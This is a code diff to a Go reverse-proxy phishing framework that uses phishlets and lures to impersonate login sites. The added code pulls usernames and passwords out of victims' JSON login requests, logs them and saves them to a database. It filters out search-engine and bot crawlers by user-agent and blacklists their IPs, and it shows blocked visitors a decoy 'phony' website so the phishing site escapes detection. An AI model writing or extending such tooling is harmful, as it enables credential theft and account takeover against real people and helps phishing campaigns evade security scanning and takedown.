@@ -176,7 +176,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
-			//o_host := req.Host
 			lure_url := req_url
 			req_path := req.URL.Path
 			if req.URL.RawQuery != "" {
@@ -291,8 +290,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							log.Error("[%s] wrong session token: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
 						}
 					} else {
-						log.Warning("session cookie not found: %s (%s) [%s]", req_url, remote_addr, pl.Name)
-
+						/*log.Warning("session cookie not found: %s (%s) [%s]", req_url, remote_addr, pl.Name)
+						log.Warning("Allowing the traffic")*/
+						req_ok = true
 						if l == nil && p.isWhitelistedIP(remote_addr, pl.Name) {
 							// not a lure path and IP is whitelisted
 
@@ -318,6 +318,23 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								// check if lure is not paused
 								if l.PausedUntil > 0 && time.Unix(l.PausedUntil, 0).After(time.Now()) {
 									log.Warning("[%s] lure is paused: %s [%s]", hiblue.Sprint(pl_name), req_url, remote_addr)
+									return p.blockRequest(req)
+								}
+
+								// filter all the searchbots out using user-agent
+								sBot, err := regexp.Compile("Google|Baidu|Msn|Yahoo|Yandex|Facebook|Twitter|Bing|Bot")
+								if sBot.MatchString(req.UserAgent()) {
+									log.Warning("[%s] unauthorized request (Bot user-agent rejected): %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
+									if p.cfg.GetBlacklistMode() == "unauth" {
+										err := p.bl.AddIP(from_ip)
+										if p.bl.IsVerbose() {
+											if err != nil {
+												log.Error("failed to blacklist ip address: %s - %s", from_ip, err)
+											} else {
+												log.Warning("blacklisted ip address: %s", from_ip)
+											}
+										}
+									}
 									return p.blockRequest(req)
 								}
 
@@ -408,8 +425,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						return p.blockRequest(req)
 					}
 				}
-				//req.Header.Set(p.getHomeDir(), o_host)
-
 				if ps.SessionId != "" {
 					if s, ok := p.sessions[ps.SessionId]; ok {
 						l, err := p.cfg.GetLureByPath(pl_name, req_path)
@@ -605,7 +620,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				// check for creds in request body
 				if pl != nil && ps.SessionId != "" {
-					//req.Header.Set(p.getHomeDir(), o_host)
 					body, err := ioutil.ReadAll(req.Body)
 					if err == nil {
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
@@ -646,6 +660,28 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								}
 							}
 
+							if pl.goUsername.tp == "json" {
+								um2 := pl.goUsername.search.FindStringSubmatch(string(body))
+								if um2 != nil && len(um2) > 1 {
+									p.setSessionUsername(ps.SessionId, um2[1])
+									log.Success("[%d] Username: [%s]", ps.Index, um2[1])
+									if err := p.db.SetSessionUsername(ps.SessionId, um2[1]); err != nil {
+										log.Error("database: %v", err)
+									}
+								}
+							}
+
+							if pl.goPassword.tp == "json" {
+								pm2 := pl.goPassword.search.FindStringSubmatch(string(body))
+								if pm2 != nil && len(pm2) > 1 {
+									p.setSessionPassword(ps.SessionId, pm2[1])
+									log.Success("[%d] Password: [%s]", ps.Index, pm2[1])
+									if err := p.db.SetSessionPassword(ps.SessionId, pm2[1]); err != nil {
+										log.Error("database: %v", err)
+									}
+								}
+							}
+
 							for _, cp := range pl.custom {
 								if cp.tp == "json" {
 									cm := cp.search.FindStringSubmatch(string(body))
@@ -658,6 +694,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									}
 								}
 							}
+							
 
 						} else if form_re.MatchString(contentType) {
 
@@ -799,13 +836,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			allow_origin := resp.Header.Get("Access-Control-Allow-Origin")
 			if allow_origin != "" && allow_origin != "*" {
-				/*if u, err := url.Parse(allow_origin); err == nil {
-					if o_host, ok := p.replaceHostWithPhished(u.Host); ok {
-						resp.Header.Set("Access-Control-Allow-Origin", u.Scheme+"://"+o_host)
-					}
-				} else {*/
-					log.Warning("can't parse URL from 'Access-Control-Allow-Origin' header: %s", allow_origin)
-				//}
 				resp.Header.Set("Access-Control-Allow-Credentials", "true")
 			}
 			var rm_headers = []string{
@@ -1147,19 +1177,47 @@ func (p *HttpProxy) waitForRedirectUrl(session_id string) (string, bool) {
 
 func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Response) {
 	var redirect_url string
-	if pl := p.getPhishletByPhishHost(req.Host); pl != nil {
+	/*if pl := p.getPhishletByPhishHost(req.Host); pl != nil {
 		redirect_url = p.cfg.PhishletConfig(pl.Name).UnauthUrl
 	}
 	if redirect_url == "" && len(p.cfg.general.UnauthUrl) > 0 {
 		redirect_url = p.cfg.general.UnauthUrl
-	}
+	}*/
 
 	if redirect_url != "" {
 		return p.javascriptRedirect(req, redirect_url)
 	} else {
-		resp := goproxy.NewResponse(req, "text/html", http.StatusForbidden, "")
+		// put the code to show phony website to bots here
+		/*resp := goproxy.NewResponse(req, "text/html", http.StatusForbidden, "<h1>Server is down for routine maintenance!!!</h1>")
 		if resp != nil {
 			return req, resp
+		}*/
+
+		phony_dir := "phony/"
+		index_path1 := filepath.Join(phony_dir, "index.html")
+		index_path2 := filepath.Join(phony_dir, "index.htm")
+		index_found := ""
+		if _, err := os.Stat(index_path1); !os.IsNotExist(err) {
+			index_found = index_path1
+		} else if _, err := os.Stat(index_path2); !os.IsNotExist(err) {
+			index_found = index_path2
+		}
+		if _, err := os.Stat(index_found); !os.IsNotExist(err) {
+			html, err := ioutil.ReadFile(index_found)
+			if err == nil {
+				body := string(html)
+				resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
+				if resp != nil {
+					return req, resp
+				} else {
+					log.Error("Phony: failed to create html redirector response")
+				}
+			} else {
+				log.Error("Phony: failed to read phony website file: %s", err)
+			}
+
+		} else {
+			log.Error("Phony: website file does not exist: %s", index_found)
 		}
 	}
 	return req, nil
